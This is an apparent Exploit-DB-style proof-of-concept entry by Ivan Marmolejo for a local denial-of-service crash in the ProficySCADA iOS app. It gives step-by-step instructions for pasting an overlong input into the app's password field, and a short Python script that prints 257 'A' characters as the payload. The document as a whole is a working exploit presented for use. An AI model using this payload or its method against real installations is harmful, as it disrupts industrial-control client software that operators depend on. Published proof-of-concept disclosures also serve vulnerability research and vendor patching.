# Exploit Title: ProficySCADA for iOS 5.0.25920 - 'Password' Denial of Service (PoC)
# Author: Ivan Marmolejo
# Date: 2020-03-22
# Vendor Homepage: https://apps.apple.com/us/app/proficyscada/id525792142
# Software Link: App Store for iOS devices
# Tested Version: 5.0.25920
# Vulnerability Type: Denial of Service (DoS) Local
# Tested on OS: iPhone 6s iOS 13.3

Steps to Produce the Crash:
1.- Run python code: ProficySCADA.py
2.- Copy content to clipboard
3.- Open "ProficySCADA for iOS"
4.- Add
5.- Username --> admin
6.- Paste ClipBoard on "Password"
7.- Add
8.- Connect
9.- Crashed

#!/usr/bin/env python

buffer = "\x41" * 257
print (buffer)